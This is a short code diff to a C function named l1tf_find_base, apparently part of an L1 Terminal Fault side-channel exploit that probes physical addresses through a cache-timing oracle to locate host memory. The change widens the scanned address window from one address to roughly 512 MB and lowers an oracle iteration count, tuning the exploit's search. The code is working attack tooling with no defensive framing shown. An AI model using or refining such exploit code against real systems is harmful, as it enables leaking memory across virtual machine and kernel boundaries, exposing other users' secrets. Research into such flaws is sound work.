@@ -705,8 +705,7 @@ uintptr_t l1tf_find_base(void)
 
   for (int run = 0; run < 10000; run++) {
     // uintptr_t start = 0; uintptr_t end = HOST_MEMORY_SIZE;
-    // uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
-    uintptr_t start = real_pa; uintptr_t end = real_pa+1;
+    uintptr_t start = real_pa-512*1024*1024; uintptr_t end = real_pa+HUGE_PAGE_SIZE;
     for (uintptr_t pa = start; pa < end; pa += PAGE_SIZE) {
       if (verbose >= 2) if (pa % (16*1024*1024) == (start & 0xfff)) {
         printf("l1tf_find_base: run %3d  |  pa  %12lx", run, pa);
@@ -716,7 +715,7 @@ uintptr_t l1tf_find_base(void)
 
       int off;
       for (off = 0; off < 16; off += 8) {
-        int hits = l1tf_oracle16(0xffff, pa+off, 1000+off*1000, NULL);
+        int hits = l1tf_oracle16(0xffff, pa+off, 100+off*1000, NULL);
         if (!hits)
           break;
         if (verbose >= 1) printf("l1tf_find_base: run %3d  | pa %12lx  |  hits %4d\n", run, pa+off, hits);
